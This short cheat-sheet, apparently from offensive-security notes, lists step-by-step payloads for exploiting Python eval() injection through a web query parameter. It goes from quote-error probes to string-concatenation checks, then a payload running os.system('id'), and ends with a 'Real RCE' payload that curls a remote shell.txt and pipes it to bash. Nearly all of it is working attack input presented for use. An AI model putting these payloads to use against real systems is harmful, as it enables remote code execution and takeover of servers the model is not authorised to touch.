# Eval() in Python



{% code overflow="wrap" %}
```python
# Check if you can get an error with ' and "
engine=Accuweather&query=1'
engine=Accuweather&query=1"
# If you see an error, it is a good sign. 

# Check if you can get no error 
engine=Accuweather&query=1'+'
engine=Accuweather&query=1'+''+'

# Check if you can get no error, and instead you see A. 
engine=Accuweather&query=1'+'A'+'

# Check if this payload works
# eval(compile("import os;os.system('id')","<String>","exec"))
engine=Accuweather&query=1'%2beval(compile("import os;os.system('id')","<String>","exec"))&2b'

# Real RCE - with shell.txt that includes a bash command
engine=Accuweather&query=1'%2beval(compile("import os;os.system('curl http://<ip address>/shell.txt | bash')","<String>","exec"))%2b'&auto_redirect=
```
{% endcode %}
